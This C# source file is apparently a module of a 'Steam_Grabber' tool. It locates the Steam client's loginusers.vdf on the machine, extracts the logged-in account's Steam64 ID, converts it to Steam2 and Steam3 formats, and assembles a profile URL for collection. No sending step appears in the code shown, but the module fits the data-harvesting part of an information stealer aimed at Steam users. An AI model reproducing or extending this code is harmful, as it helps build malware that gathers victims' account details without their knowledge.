namespace Steam_Grabber
{
    using System;
    using System.Globalization;
    using System.IO;
    using System.Text;
    using System.Text.RegularExpressions;

    public class SteamProfiles
    {
        private static readonly string LoginFile = Path.Combine(SteamPath.GetLocationSteam(), @"config\loginusers.vdf");
        private static StringBuilder SB = new StringBuilder();

        public static string GetSteamID()
        {
            try
            {
                if (!File.Exists(LoginFile))
                {
                    return null;
                }
                else
                {
                    var ProfileNum = File.ReadAllLines(LoginFile)[2].Split('"')[1];
                    if (Regex.IsMatch(ProfileNum, SteamConverter.STEAM64))
                    {
                        var ConvertID = SteamConverter.FromSteam64ToSteam2(Convert.ToInt64(ProfileNum));
                        var ConvertSteam3 = $"{SteamConverter.STEAMPREFIX}{SteamConverter.FromSteam64ToSteam32(Convert.ToInt64(ProfileNum)).ToString(CultureInfo.InvariantCulture)}";
                        SB.AppendLine($"Steam2 ID: {ConvertID}");
                        SB.AppendLine($"Steam3 ID x32: {ConvertSteam3}");
                        SB.AppendLine($"Steam3 ID x64: {ProfileNum}");
                        SB.AppendLine($"{SteamConverter.HTTPS}{ProfileNum}");
                        return SB.ToString();
                    }
                    else { return null; }
                }
            }
            catch { return null; }
        }
    }
}